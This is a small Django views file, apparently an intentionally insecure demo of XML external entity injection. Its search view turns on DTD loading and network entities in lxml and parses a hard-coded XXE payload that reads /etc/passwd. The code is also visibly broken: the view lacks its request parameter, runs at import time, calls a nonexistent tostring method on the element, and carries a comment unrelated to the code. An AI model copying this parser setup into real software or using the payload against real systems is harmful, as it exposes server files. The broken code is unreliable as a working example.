from django.shortcuts import render
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt
from lxml import etree
#from defusedxml import pulldom

def index(request):
    return render(request, 'insecure_website.html')

@csrf_exempt
def search(): # request

    parser = etree.XMLParser(no_network=False, dtd_validation=False, load_dtd=True)  # to enable network entity. see xmlparser-info.txt
    # request.body.encode()
    payload = """
    <?xml version="1.0"?>
        <!DOCTYPE foo [  
        <!ELEMENT foo (#ANY)>
        <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
        """

    doc = etree.fromstring(payload, parser)
    print(doc.tostring.decode('utf8'))
    # now in the object cd, you have the form as a dictionary.
    return HttpResponse(f"Results:")

search()